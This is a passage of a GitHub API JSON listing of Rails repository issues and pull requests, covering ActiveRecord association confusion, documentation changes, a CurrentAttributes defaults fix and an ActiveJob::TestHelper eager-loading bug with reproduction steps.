            "node_id": "MDQ6VXNlcjUwOTgzNw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/509837?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ghiculescu",
            "html_url": "https://github.com/ghiculescu",
            "followers_url": "https://api.github.com/users/ghiculescu/followers",
            "following_url": "https://api.github.com/users/ghiculescu/following{/other_user}",
            "gists_url": "https://api.github.com/users/ghiculescu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ghiculescu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ghiculescu/subscriptions",
            "organizations_url": "https://api.github.com/users/ghiculescu/orgs",
            "repos_url": "https://api.github.com/users/ghiculescu/repos",
            "events_url": "https://api.github.com/users/ghiculescu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ghiculescu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T22:41:11Z",
        "updated_at": "2024-01-12T10:01:20Z",
        "closed_at": "2024-01-12T09:38:34Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50719",
            "html_url": "https://github.com/rails/rails/pull/50719",
            "diff_url": "https://github.com/rails/rails/pull/50719.diff",
            "patch_url": "https://github.com/rails/rails/pull/50719.patch",
            "merged_at": "2024-01-12T09:38:34Z"
        },
        "body": "Nitpick RE https://github.com/rails/rails/pull/50463\r\n\r\nBefore:\r\n\r\n![image](https://github.com/rails/rails/assets/509837/44dccf9e-6ee1-4987-8f96-3f3722ef5655)\r\n\r\nAfter:\r\n\r\n![image](https://github.com/rails/rails/assets/509837/bf2843fa-8872-421f-9958-e7b22f00ddfd)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50719/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50719/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50718",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50718/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50718/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50718/events",
        "html_url": "https://github.com/rails/rails/issues/50718",
        "id": 2077468885,
        "node_id": "I_kwDNIULOe9Oo1Q",
        "number": 50718,
        "title": "Rails eager loads by default, disabled when one column is set to nullable in database schema",
        "user": {
            "login": "St4niuu",
            "id": 96002040,
            "node_id": "U_kgDOBbjf-A",
            "avatar_url": "https://avatars.githubusercontent.com/u/96002040?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/St4niuu",
            "html_url": "https://github.com/St4niuu",
            "followers_url": "https://api.github.com/users/St4niuu/followers",
            "following_url": "https://api.github.com/users/St4niuu/following{/other_user}",
            "gists_url": "https://api.github.com/users/St4niuu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/St4niuu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/St4niuu/subscriptions",
            "organizations_url": "https://api.github.com/users/St4niuu/orgs",
            "repos_url": "https://api.github.com/users/St4niuu/repos",
            "events_url": "https://api.github.com/users/St4niuu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/St4niuu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-11T19:48:59Z",
        "updated_at": "2024-01-12T08:34:15Z",
        "closed_at": "2024-01-12T08:34:15Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nI've got a model called Occurences:\r\nSchema: \r\n\r\n```ruby\r\nclass CreateOccurences < ActiveRecord::Migration[7.0]\r\n  def change\r\n    create_table :occurences do |t|\r\n      t.integer :state, null: false\r\n      t.string :injector, null: false\r\n      t.string :description, null: true\r\n      t.string :start_employee, null: false\r\n      t.string :finish_employee, null: true\r\n      t.timestamp :start, null: false\r\n      t.timestamp :finish, null: true\r\n    end\r\n\r\n    add_foreign_key :occurences, :injectors, column: :injector\r\n    add_foreign_key :occurences, :employees, column: :start_employee\r\n    add_foreign_key :occurences, :employees, column: :finish_employee\r\n\r\n  end\r\nend\r\n```\r\nModel:\r\n```ruby\r\nclass Occurence < ApplicationRecord\r\n  belongs_to :injector, foreign_key: :injector\r\n  belongs_to :start_employee, foreign_key: :start_employee, class_name: \"Employee\"\r\n  belongs_to :end_employee, foreign_key: :finish_employee, class_name: \"Employee\", optional: true\r\nend\r\n```\r\n\r\nAnd a Employee model:\r\nSchema:\r\n```ruby\r\nclass CreateEmployees < ActiveRecord::Migration[7.0]\r\n  def change\r\n    create_table :employees, id: false do |t|\r\n      t.string :id, null: false, index: { unique: true }, primary_key: true\r\n      t.string :name, null: false\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nModel:\r\n```ruby\r\nclass Employee < ApplicationRecord\r\n  has_many :start_employee, foreign_key: :start_employee\r\n  has_many :finish_employee, foreign_key: :finish_employee\r\nend\r\n```\r\n\r\n\r\nOn object creation, finish_employee is undefined, on update finish_employee is being set.\r\n\r\n### Expected behavior\r\nThe key problem here is that, rails loses ability to eager load a column when it can be null, whatever it goes as value.\r\n\r\n### Actual behavior\r\nWhen I update the occurence object to provide  finish_employee and finish attributes, as of my definition in code - finish_employee expects instance of Employee, so under @occurence[:finish_employee] goes query with find function, to find the actual employee. To my suprise, when I tried to save \"updated\" occurence, rails tried to save ruby object's id \"#<Employee:0x0000026f69911560\" as a string, not its actual id as it was in start_employee. Despite of writing Employee object itself under @occurence[:start_employee], it's been saved as employee's id. The same happens when I fetch this, start_employee is being returned as eagerly loaded object, not only employee's id, finish_employee is loade with loaded only with pure id. Hope you get my problem.\r\n\r\nHere is example of one fetched occurence, after the initial creation and update with finish values:\r\nIn this example I was forced to pass only the id of fetched Employee to the finish_employee attribute, cause it otherwise tried to save ruby object's id, problem is I don't have any employee with such an ID.\r\n\r\n{\r\n    \"data\": {\r\n        \"id\": 1,\r\n        \"state\": 4,\r\n        \"injector\": {\r\n            \"id\": \"ST 52\",\r\n            \"location\": {\r\n                \"id\": \"Location name\"\r\n            },\r\n            \"duration\": 120,\r\n            \"ip\": \"0.0.0.0\"\r\n        },\r\n        \"description\": \"\",\r\n        \"start_employee\": {\r\n            \"id\": \"3779332794\",\r\n            \"name\": \"Surname Name\"\r\n        },\r\n        \"finish_employee\": \"3779332794\",\r\n        \"start\": \"2024-01-11T20:43:53.000Z\",\r\n        \"finish\": \"2024-01-11T20:44:14.000Z\"\r\n    }\r\n}\r\n\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50718/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50718/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50717",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50717/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50717/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50717/events",
        "html_url": "https://github.com/rails/rails/pull/50717",
        "id": 2077465816,
        "node_id": "PR_kwDNIULOY9n-Rg",
        "number": 50717,
        "title": "Expand documentation for ActiveRecord::Core #dup and #clone",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-11T19:46:53Z",
        "updated_at": "2024-01-17T10:26:04Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": true,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50717",
            "html_url": "https://github.com/rails/rails/pull/50717",
            "diff_url": "https://github.com/rails/rails/pull/50717.diff",
            "patch_url": "https://github.com/rails/rails/pull/50717.patch",
            "merged_at": null
        },
        "body": "Splits the examples for `#clone` into separate sections for easier scanability.\r\n\r\nAdds examples to `#dup` to clarify the difference with `#clone`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50717/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50717/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50716",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50716/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50716/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50716/events",
        "html_url": "https://github.com/rails/rails/pull/50716",
        "id": 2077391551,
        "node_id": "PR_kwDNIULOY9j6Vw",
        "number": 50716,
        "title": "Fix assertion method call",
        "user": {
            "login": "jonathanhefner",
            "id": 771968,
            "node_id": "MDQ6VXNlcjc3MTk2OA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/771968?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jonathanhefner",
            "html_url": "https://github.com/jonathanhefner",
            "followers_url": "https://api.github.com/users/jonathanhefner/followers",
            "following_url": "https://api.github.com/users/jonathanhefner/following{/other_user}",
            "gists_url": "https://api.github.com/users/jonathanhefner/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jonathanhefner/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jonathanhefner/subscriptions",
            "organizations_url": "https://api.github.com/users/jonathanhefner/orgs",
            "repos_url": "https://api.github.com/users/jonathanhefner/repos",
            "events_url": "https://api.github.com/users/jonathanhefner/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jonathanhefner/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-11T18:57:43Z",
        "updated_at": "2024-01-11T19:06:35Z",
        "closed_at": "2024-01-11T19:06:35Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50716",
            "html_url": "https://github.com/rails/rails/pull/50716",
            "diff_url": "https://github.com/rails/rails/pull/50716.diff",
            "patch_url": "https://github.com/rails/rails/pull/50716.patch",
            "merged_at": null
        },
        "body": "Follow up to #50382.\r\n\r\n`assert_queries` was renamed to `assert_queries_count` in #50373.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50716/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50716/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50715",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50715/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50715/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50715/events",
        "html_url": "https://github.com/rails/rails/pull/50715",
        "id": 2077370167,
        "node_id": "PR_kwDNIULOY9iwIg",
        "number": 50715,
        "title": "[Fix #50713] Do not trigger loading of ActiveJob::Base in ActiveJob::TestHelper",
        "user": {
            "login": "maximerety",
            "id": 58582,
            "node_id": "MDQ6VXNlcjU4NTgy",
            "avatar_url": "https://avatars.githubusercontent.com/u/58582?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/maximerety",
            "html_url": "https://github.com/maximerety",
            "followers_url": "https://api.github.com/users/maximerety/followers",
            "following_url": "https://api.github.com/users/maximerety/following{/other_user}",
            "gists_url": "https://api.github.com/users/maximerety/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/maximerety/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/maximerety/subscriptions",
            "organizations_url": "https://api.github.com/users/maximerety/orgs",
            "repos_url": "https://api.github.com/users/maximerety/repos",
            "events_url": "https://api.github.com/users/maximerety/events{/privacy}",
            "received_events_url": "https://api.github.com/users/maximerety/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T18:42:58Z",
        "updated_at": "2024-01-11T20:26:47Z",
        "closed_at": "2024-01-11T19:41:21Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50715",
            "html_url": "https://github.com/rails/rails/pull/50715",
            "diff_url": "https://github.com/rails/rails/pull/50715.diff",
            "patch_url": "https://github.com/rails/rails/pull/50715.patch",
            "merged_at": "2024-01-11T19:41:21Z"
        },
        "body": "\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created to avoid the immediate loading of `ActiveJob::Base` when loading `ActiveJob::TestHelper`.\r\n\r\nFixes https://github.com/rails/rails/issues/50713.\r\n\r\n### Detail\r\n\r\nThis Pull Request wraps a modification on `ActiveJob::Base` in an `ActiveSupport.on_load(:active_job)` hook, to defer loading until absolutely necessary.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50715/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50715/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50714",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50714/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50714/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50714/events",
        "html_url": "https://github.com/rails/rails/pull/50714",
        "id": 2077368323,
        "node_id": "PR_kwDNIULOY9iptg",
        "number": 50714,
        "title": "Prevent `CurrentAttributes` defaults from leaking",
        "user": {
            "login": "jonathanhefner",
            "id": 771968,
            "node_id": "MDQ6VXNlcjc3MTk2OA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/771968?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jonathanhefner",
            "html_url": "https://github.com/jonathanhefner",
            "followers_url": "https://api.github.com/users/jonathanhefner/followers",
            "following_url": "https://api.github.com/users/jonathanhefner/following{/other_user}",
            "gists_url": "https://api.github.com/users/jonathanhefner/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jonathanhefner/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jonathanhefner/subscriptions",
            "organizations_url": "https://api.github.com/users/jonathanhefner/orgs",
            "repos_url": "https://api.github.com/users/jonathanhefner/repos",
            "events_url": "https://api.github.com/users/jonathanhefner/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jonathanhefner/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T18:41:36Z",
        "updated_at": "2024-01-11T19:07:59Z",
        "closed_at": "2024-01-11T18:58:26Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50714",
            "html_url": "https://github.com/rails/rails/pull/50714",
            "diff_url": "https://github.com/rails/rails/pull/50714.diff",
            "patch_url": "https://github.com/rails/rails/pull/50714.patch",
            "merged_at": "2024-01-11T18:58:26Z"
        },
        "body": "Follow-up to #50677.\r\n\r\nPrior to this commit, all `ActiveSupport::CurrentAttributes` subclasses stored their default values in the same `Hash`, causing default values to leak between classes.  This commit ensures each subclass maintains a separate `Hash`.\r\n\r\nThis commit also simplifies the resolution of default values, replacing the `merge_defaults!` method with `resolve_defaults`.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50714/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50714/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50713",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50713/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50713/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50713/events",
        "html_url": "https://github.com/rails/rails/issues/50713",
        "id": 2077355553,
        "node_id": "I_kwDNIULOe9HuIQ",
        "number": 50713,
        "title": "ActiveJob::TestHelper should not trigger the immediate loading of ActiveJob::Base",
        "user": {
            "login": "maximerety",
            "id": 58582,
            "node_id": "MDQ6VXNlcjU4NTgy",
            "avatar_url": "https://avatars.githubusercontent.com/u/58582?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/maximerety",
            "html_url": "https://github.com/maximerety",
            "followers_url": "https://api.github.com/users/maximerety/followers",
            "following_url": "https://api.github.com/users/maximerety/following{/other_user}",
            "gists_url": "https://api.github.com/users/maximerety/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/maximerety/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/maximerety/subscriptions",
            "organizations_url": "https://api.github.com/users/maximerety/orgs",
            "repos_url": "https://api.github.com/users/maximerety/repos",
            "events_url": "https://api.github.com/users/maximerety/events{/privacy}",
            "received_events_url": "https://api.github.com/users/maximerety/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T18:33:03Z",
        "updated_at": "2024-01-11T19:41:22Z",
        "closed_at": "2024-01-11T19:41:22Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Description\r\n\r\n`ActiveJob::TestHelper` triggers the immediate loading of `ActiveJob::Base` because of the following line in its implementation:\r\n\r\nhttps://github.com/rails/rails/blob/4230d0d2be9e4c85f6a32debe72cf98d8d464416/activejob/lib/active_job/test_helper.rb#L37\r\n\r\nThis is unexpected as other parts of `ActiveJob` take great care of deferring the loading of `ActiveJob::Base` thanks to the following construct:\r\n\r\n```ruby\r\nActiveSupport.on_load(:active_job) do\r\n  # Do something with ActiveJob::Base\r\nend\r\n```\r\n\r\nUnfortunately, this can lead to situations in which `ActiveJob` configurations are not applied, because defined after the loading of `ActiveJob::Base`.\r\n\r\nExample of such a situation:\r\n\r\n1. Have a gem  in the `Gemfile` that (most likely inadvertently) triggers the loading of `ActiveJob::TestHelper`;\r\n2. Have `ActiveJob` configurations a in `config/initializers/active_job.rb` file (loaded after the gems from the application).\r\n\r\n### Steps to reproduce\r\n\r\nIn a terminal, set up this demo application:\r\n\r\n```shell\r\nrails new active-job-issue-50713 && cd active-job-issue-50713\r\n\r\ncat <<RUBY >> Gemfile\r\n\r\ngem 'api-auth', '1.5.0'\r\n\r\ngroup :test do\r\n  gem 'minitest-spec-rails', '7.2.0'\r\nend\r\nRUBY\r\n\r\nbundle install\r\n\r\ncat <<RUBY > config/initializers/active_job.rb\r\nRails.application.config.active_job.default_queue_name = \"custom_default_queue\"\r\nRUBY\r\n\r\nmkdir -p test/jobs\r\n\r\ncat <<RUBY > test/jobs/application_job_test.rb\r\nrequire 'test_helper'\r\n\r\nclass ApplicationJobTest < ActiveSupport::TestCase\r\n  test \"default queue configured\" do\r\n    assert_equal \"custom_default_queue\", ApplicationJob.default_queue_name\r\n  end\r\nend\r\nRUBY\r\n```\r\n\r\nThen, run this test:\r\n\r\n```shell\r\nbin/rails test test/jobs/application_job_test.rb\r\n```\r\n\r\n#### Expected behavior\r\n\r\nThe test should pass, i.e. `ActiveJob::TestHelper` should not trigger the immediate loading of `ActiveJob::Base`, and let the the process load it (lazily or eagerly) when actually needed.\r\n\r\n#### Actual behavior\r\n\r\nThe test does not pass, since `ActiveJob::TestHelper` triggers the immediate loading of `ActiveJob::Base`.\r\n\r\n#### System configuration\r\n\r\n**Rails version**: 7.1.2 / main\r\n\r\n**Ruby version**: 3.2.2\r\n\r\n#### Detailed explanations about the test failure\r\n\r\nA legacy version of the `api-auth` gem is referenced in the `Gemfile`, which triggers the loading of `ActionController::Base` here: https://github.com/mgomes/api_auth/blob/v1.5.0/lib/api_auth/railtie.rb#L33-L35 (note that latest versions of the gem fixed that undesired behavior).\r\n\r\nIn turn, loading `ActionController::Base` triggers the loading of `ActionDispatch::IntegrationTest` in  `minitest-spec-rails`, another gem used in tests, see:\r\n* https://github.com/metaskills/minitest-spec-rails/blob/v7.2.0/lib/minitest-spec-rails/railtie.rb#L15\r\n* https://github.com/metaskills/minitest-spec-rails/blob/v7.2.0/lib/minitest-spec-rails/init/action_dispatch.rb#L14\r\n\r\nIn turn, loading `ActionDispatch::IntegrationTest` triggers the loading of `ActionMailer::TestHelper` here: https://github.com/rails/rails/blob/v7.1.2/actionmailer/lib/action_mailer/railtie.rb#L66.\r\n\r\nIn turn, loading `ActionMailer::TestHelper` triggers the loading of `ActiveJob::TestHelper` here: https://github.com/rails/rails/blob/v7.1.2/actionmailer/lib/action_mailer/test_helper.rb#L10.\r\n\r\nFinally, `ActiveJob::TestHelper` triggers the eager loading of `ActiveJob::Base` here: https://github.com/rails/rails/blob/v7.1.2/activejob/lib/active_job/test_helper.rb#L37\r\n\r\nThis code could/should be wrapped in a loading hook instead:\r\n\r\n```diff\r\n- ActiveJob::Base.include(TestQueueAdapter)\r\n+ ActiveSupport.on_load(:active_job) do\r\n+   ActiveJob::Base.include(TestQueueAdapter)\r\n+ end\r\n```\r\n\r\nNow, since `ActiveJob::Base` is eager loaded during the loading of the gems, it is before our initializers get a chance to run and modify the configs, which triggers the issue.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50713/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50713/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50712",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50712/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50712/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50712/events",
        "html_url": "https://github.com/rails/rails/issues/50712",
        "id": 2077228051,
        "node_id": "I_kwDNIULOe8_8Ew",
        "number": 50712,
        "title": "(parallelization threshold is 50)",
        "user": {
            "login": "pedrodiogop",
            "id": 105749703,
            "node_id": "U_kgDOBk2cxw",
            "avatar_url": "https://avatars.githubusercontent.com/u/105749703?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/pedrodiogop",
            "html_url": "https://github.com/pedrodiogop",
            "followers_url": "https://api.github.com/users/pedrodiogop/followers",
            "following_url": "https://api.github.com/users/pedrodiogop/following{/other_user}",
            "gists_url": "https://api.github.com/users/pedrodiogop/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/pedrodiogop/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/pedrodiogop/subscriptions",
            "organizations_url": "https://api.github.com/users/pedrodiogop/orgs",
            "repos_url": "https://api.github.com/users/pedrodiogop/repos",
            "events_url": "https://api.github.com/users/pedrodiogop/events{/privacy}",
            "received_events_url": "https://api.github.com/users/pedrodiogop/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-11T17:26:19Z",
        "updated_at": "2024-01-11T17:30:54Z",
        "closed_at": "2024-01-11T17:28:43Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Yesterday I was running the App without a problem but today I can't run. This should be simple but since I m new I don't know how to correct this issue. \r\n\r\n### Expected behavior\r\nThe App should just start.\r\n\r\n### Actual behavior\r\nI receive this:\r\nrails -s \r\nRunning 0 tests in a single process (parallelization threshold is 50)\r\nRun options: --seed 52290\r\n\r\n# Running:\r\n\r\n\r\n\r\nFinished in 0.000377s, 0.0000 runs/s, 0.0000 assertions/s.\r\n0 runs, 0 assertions, 0 failures, 0 errors, 0 skips\r\n\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: ruby 3.1.2p20 (2022-04-12 revision 4491bb740a) [arm64-darwin23]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50712/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
